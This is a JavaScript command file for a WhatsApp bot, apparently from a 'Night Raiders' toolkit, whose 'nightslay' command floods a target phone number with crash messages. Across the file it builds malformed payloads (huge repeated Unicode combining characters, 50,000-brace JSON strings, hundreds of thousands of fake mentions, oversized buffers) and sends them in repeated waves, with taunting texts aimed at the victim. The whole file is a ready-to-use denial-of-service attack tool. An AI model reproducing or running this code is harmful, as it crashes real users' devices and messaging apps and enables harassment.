 const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

module.exports = {
  name: 'nightslay',
  aliases: ['slay', 'ioscrash', 'applecrash', 'iphonekill', 'ioskiller', 'fruitninja', 'applebye'],
  description: '👿 ɪᴏs ᴅᴇᴍᴏɴ - ᴄʀᴀsʜᴇs ɪᴏs ᴅᴇᴠɪᴄᴇs ᴡɪᴛʜ ᴅᴇᴍᴏɴɪᴄ ᴘᴏᴡᴇʀ',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    const target = args[0];
    const ownerNumbers = helpers.getOwnerNumbers();
    const ownerJid = ownerNumbers[0] ? `${ownerNumbers[0]}@s.whatsapp.net` : sender;
    
    if (!target) {
      return await sock.sendMessage(chatId, { 
        text: `╔═════════════════════════════════

⛔ ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ

📱 ᴜsᴀɢᴇ: .ɴɪɢʜᴛsʟᴀʏ <ɴᴜᴍʙᴇʀ>
🛑 sᴛᴏᴘ: .ɴɪɢʜᴛsʟᴀʏ sᴛᴏᴘ

☠️ ᴛʜɪs ᴅᴇᴍᴏɴ ᴄʀᴀsʜᴇs ᴅᴇᴠɪᴄᴇs ᴜsᴇ ᴡɪsᴇʟʏ, ʀᴀɪᴅᴇʀ.
╰─────────────────────────────────` 
      });
    }

    if (target.toLowerCase() === 'stop') {
      const stopped = attackManager.stopAllAttacksForSender(sender);
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🛑 ᴀᴛᴛᴀᴄᴋ ʜᴀʟᴛᴇᴅ 🛑
╚═══════════════════════════════════════════╝

${stopped > 0 ? `✅ sᴛᴏᴘᴘᴇᴅ ${stopped} ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ(s)` : '⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ғᴏᴜɴᴅ'}

👿 "ᴛʜᴇ ᴅᴇᴍᴏɴ ʀᴇsᴛs... ғᴏʀ ɴᴏᴡ" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
    const attackId = attackManager.generateAttackId(sender, targetJid, 'nightslay');

    if (attackManager.isAttackActive(attackId)) {
      return await sock.sendMessage(chatId, { 
        text: `⚠️ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ ᴏɴ ᴛʜɪs ᴛᴀʀɢᴇᴛ!\n\n🛑 ᴜsᴇ .ɴɪɢʜᴛsʟᴀʏ sᴛᴏᴘ ᴛᴏ ʜᴀʟᴛ` 
      });
    }

    attackManager.startAttack(attackId, {
      sender,
      target: targetJid,
      commandName: 'nightslay',
      chatId
    });

    await sock.sendMessage(chatId, { 
      text: `╔═══════════════════════════════════════════╗
║ 👿 ɴɪɢʜᴛsʟᴀʏ ᴅᴇᴍᴏɴ ᴜɴʟᴇᴀsʜᴇᴅ 👿
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ɪᴏs ᴅᴇᴍᴏɴ...
🔄 ᴄʏᴄʟᴇs: 0/100

👿 "ᴛʜᴇ ᴅᴀʀᴋɴᴇss ᴄᴏɴsᴜᴍᴇs" ☠️
╰────────────────────────────────────────╯` 
    });

    const VampireCrashiPhone = async () => {
      sock.relayMessage(targetJid, {
        extendedTextMessage: {
          text: `ɪᴏs ᴄʀᴀsʜ` + "࣯ꦾ".repeat(90000),
          contextInfo: {
            fromMe: false,
            stanzaId: targetJid,
            participant: targetJid,
            quotedMessage: { conversation: "ɴɪɢʜᴛʀᴀɪᴅᴇʀs ‌" + "ꦾ".repeat(90000) },
            disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
          },
          inviteLinkGroupTypeV2: "DEFAULT",
        },
      }, { participant: { jid: targetJid } }, { messageId: null });
    };

    const VampireiPhone = async () => {
      try {
        await sock.relayMessage(targetJid, {
          extendedTextMessage: {
            text: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs ɪᴏs",
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: targetJid,
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [{ jid: targetJid, callOutcome: "1" }],
                },
              },
              remoteJid: targetJid,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        }, { participant: { jid: targetJid } });
      } catch (err) {
        console.log(err);
      }
    };

    const VampireBlankIphone = async () => {
      try {
        const messsage = {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: `33333333333333333@newsletter`,
                newsletterName: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs" + "ી".repeat(120000),
                jpegThumbnail: "",
                caption: "ꦽ".repeat(120000),
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        };
        await sock.relayMessage(targetJid, messsage, { userJid: targetJid });
      } catch (err) {
        console.log(err);
      }
    };

    const VampireInvisIphone = async () => {
      sock.relayMessage(targetJid, {
        extendedTextMessage: {
          text: "ꦾ".repeat(55000),
          contextInfo: {
            stanzaId: targetJid,
            participant: targetJid,
            quotedMessage: { conversation: "ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs ɪᴏs" + "ꦾ࣯࣯".repeat(50000) },
            disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
          },
          inviteLinkGroupTypeV2: "DEFAULT",
        },
      }, { participant: { jid: targetJid } }, { messageId: null });
    };

    const VampireSupIos = async () => {
      sock.relayMessage(targetJid, {
        extendedTextMessage: {
          text: `ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs ɪᴏs -` + "࣯ꦾ".repeat(90000),
          contextInfo: {
            fromMe: false,
            stanzaId: targetJid,
            participant: targetJid,
            quotedMessage: { conversation: "ʙʟᴀɴᴋ ɪᴏs ‌" + "꧒꧆".repeat(90000) },
            disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
          },
          inviteLinkGroupTypeV2: "DEFAULT",
        },
      }, { participant: { jid: targetJid } }, { messageId: null });
    };

    const AndroidKiller = async () => {
      await sock.relayMessage(targetJid, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { hasMediaAttachment: false, title: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】" },
              body: { text: "ꦾ".repeat(60000) },
              nativeFlowMessage: { messageParamsJson: "{".repeat(50000) }
            }
          }
        }
      }, {});

      await sock.relayMessage(targetJid, {
        viewOnceMessage: {
          message: {
            buttonsMessage: {
              text: "ꦾ".repeat(60000),
              contentText: "ɴɪɢʜᴛsᴛʀɪᴋᴇ",
              buttons: [{
                buttonId: "{".repeat(10000),
                buttonText: { displayText: "\u0000".repeat(9999) },
                type: "NATIVE_FLOW",
                nativeFlowInfo: { name: "cta_url", paramsJson: "{".repeat(50000) },
              }],
              headerType: "TEXT"
            }
          }
        }
      }, {});
    };

    const MrHeatDemon = async () => {
      const payload = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { title: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】", hasMediaAttachment: false },
              body: { text: "🔥".repeat(50000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(50000),
                buttons: [{ name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) }],
              },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                externalAdReply: {
                  title: "ᴍʀ ʜᴇᴀᴛ",
                  body: "ោ៝".repeat(10000),
                  mediaType: 1,
                  thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                },
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, payload, {});
    };

    const SAMSUNGCRASH = async () => {
      await sock.relayMessage(targetJid, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { hasMediaAttachment: false, title: "ꦾ".repeat(60000) },
              body: { text: "" },
              nativeFlowMessage: { messageParamsJson: "{".repeat(50000) }
            }
          }
        }
      }, {});

      await sock.relayMessage(targetJid, {
        viewOnceMessage: {
          message: {
            buttonsMessage: {
              text: "ꦾ".repeat(60000),
              contentText: "null",
              buttons: [{
                buttonId: "{".repeat(10000),
                buttonText: { displayText: "\u0000".repeat(9999) },
                type: "NATIVE_FLOW",
                nativeFlowInfo: { name: "cta_url", paramsJson: "{".repeat(50000) },
              }],
              headerType: "TEXT"
            }
          }
        }
      }, {});
    };

    const FlowXNull = async () => {
      const MSG = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "👿 ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs【☠︎】\n" + "@0@1".repeat(30000),
                format: "DEFAULT",
                contextInfo: {
                  mentionedJid: [
                    targetJid,
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                  ],
                  disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
                }
              },
              nativeFlowResponseMessage: {
                name: "night_raiders_flame",
                paramsJson: "{".repeat(50000) + "}".repeat(50000), 
                version: 3
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, MSG, { participant: { jid: targetJid } });
    };

    const texts = [
      "ᬼ".repeat(200000),
      "ោ៝".repeat(200000),
      "𑜦𑜠".repeat(200000),
      "ꦾ".repeat(200000),
      ".ؕ".repeat(100000) + "۝".repeat(100000),
      "ًٌٍَُِّْ".repeat(100000),
      "\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\uFEFF".repeat(80000),
      "᱃ֻࣰࣱٍ᳕͙ࣹ͙ࣩ̫᳕͙ࣹ̫̈٘ͧۛ̃ۡ᳓ࣰً᳕ܾࣶ֖᷽ۡ᪳ࣧ᳚᪳".repeat(80000),
      "󠄞".repeat(50000)
    ];

    const omenAttack = async () => {
      for (let wave = 0; wave < 10; wave++) {
        for (const text of texts) {
          try {
            const payload = await generateWAMessageFromContent(targetJid, {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: { title: "☠️ OMEN FINAL STRIKE ☠️", hasMediaAttachment: true },
                    body: { text: "\n".repeat(500) + text },
                    nativeFlowMessage: {
                      messageParamsJson: '{"data":' + '"'.repeat(50000) + "}" + "}".repeat(300),
                      buttons: Array(20).fill().map((_, i) => ({
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          crash: "💀".repeat(10000),
                          lag: "󠄞".repeat(20000),
                          overflow: new Array(99999).fill("NIGHT").join("")
                        })
                      }))
                    },
                    contextInfo: {
                      forwardingScore: 999999,
                      isForwarded: true,
                      externalAdReply: {
                        title: "☠️ YOUR PHONE IS DYING ☠️",
                        body: "ោ៝".repeat(50000),
                        mediaType: 2,
                        thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                        mediaUrl: "http://" + "A".repeat(20000) + ".com",
                        sourceUrl: "market://details?id=" + "com.whatsapp".repeat(1000)
                      },
                      quotedMessage: {
                        extendedTextMessage: {
                          text: "CRASHING IN 3...2...1..." + "\u2800".repeat(100000),
                          inviteLinkGroupTypeV2: "DEFAULT"
                        }
                      },
                      groupInviteMessage: {
                        inviteCode: "Z".repeat(50000),
                        inviteExpiration: Number.MAX_SAFE_INTEGER * 999999,
                        groupName: "☠️ VICTIM'S FUNERAL ☠️".repeat(100),
                        caption: "You opened the wrong message."
                      }
                    }
                  }
                }
              }
            }, {});

            for (let i = 0; i < 8; i++) {
              try {
                await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id + i });
              } catch (_) {}
            }
            await new Promise(r => setTimeout(r, 100));
          } catch (err) {
            console.error('Omen attack error:', err.message);
          }
        }
      }
    };

    const kill = async () => {
      for (let wave = 0; wave < 30; wave++) {
        try {
          const p1 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/999999999_000000000000000000000000000000_n.enc",
                  mimetype: "image/jpeg",
                  fileLength: "999999999999",
                  jpegThumbnail: Buffer.alloc(2 * 1024 * 1024, 0),
                  contextInfo: {
                    mentionedJid: Array.from({length: 180000}, () => `${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
                    forwardingScore: 999999999,
                    isForwarded: true,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast"
                  }
                }
              }
            }
          }, {});

          const p2 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                newsletterAdminInviteMessage: {
                  newsletterJid: "0".repeat(99999) + "@newsletter",
                  newsletterName: "ꦾ࣯".repeat(150000),
                  caption: ""
                }
              }
            }
          }, {});

          const p3 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: { text: "" },
                  nativeFlowMessage: {
                    name: "DEATH",
                    paramsJson: "\u0000".repeat(1500000) + "ꦾ".repeat(200000)
                  },
                  messageContextInfo: { messageSecret: crypto.randomBytes(64) }
                }
              }
            }
          }, {});

          const p4 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: "\u200E".repeat(200000) + "\u202E" + "࣯ꦾ".repeat(200000),
                  contextInfo: {
                    quotedMessage: { callLogMessage: { callType: "VIDEO", durationSecs: 0 } },
                    forwardingScore: 999999999,
                    isForwarded: true
                  }
                }
              }
            }
          }, {});

          const p5 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                videoMessage: {
                  fileLength: "999999999999999",
                  seconds: 999999999,
                  mediaKey: crypto.randomBytes(32).toString('base64'),
                  streamingSidecar: Buffer.alloc(3 * 1024 * 1024, 0),
                  contextInfo: {
                    externalAdReply: {
                      title: "",
                      body: "ꦾ".repeat(200000),
                      thumbnail: Buffer.alloc(2 * 1024 * 1024, 0)
                    },
                    mentionedJid: Array(200000).fill("0@s.whatsapp.net")
                  }
                }
              }
            }
          }, {});

          for (let i = 0; i < 20; i++) {
            const payloads = [p1, p2, p3, p4, p5];
            for (const payload of payloads) {
              try {
                await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id });
              } catch (_) {}
            }
          }
        } catch (err) {
          console.error('Nightslay kill wave error:', err.message);
        }
      }
    };

    const attackFunction = async () => {
      await VampireCrashiPhone();
      await VampireiPhone();
      await VampireInvisIphone();
      await VampireBlankIphone();
      await VampireSupIos();
      await AndroidKiller();
      await MrHeatDemon();
      await SAMSUNGCRASH();
      await FlowXNull();
      await omenAttack();
      await kill();
    };

    const onProgress = async (cycle, max) => {
      try {
        await sock.sendMessage(ownerJid, { 
          text: `👿 ɴɪɢʜᴛsʟᴀʏ ᴘʀᴏɢʀᴇss\n🎯 ${target}\n📊 ${cycle}/${max} sᴇɴᴛ` 
        });
      } catch (e) {}
    };

    const onComplete = async (cycle, status) => {
      const statusText = status === 'stopped' ? '🛑 sᴛᴏᴘᴘᴇᴅ' : '✅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ';
      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 👿 ɴɪɢʜᴛsʟᴀʏ ${statusText} 👿
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
📊 ᴄʏᴄʟᴇs ᴄᴏᴍᴘʟᴇᴛᴇᴅ: ${cycle}/100

👿 "ᴛʜᴇ ᴅᴇᴍᴏɴ ʜᴀs sᴘᴏᴋᴇɴ" ☠️
╰────────────────────────────────────────╯` 
      });
    };

    attackManager.runContinuousAttack(sock, attackId, attackFunction, onProgress, onComplete);
  }
}; 
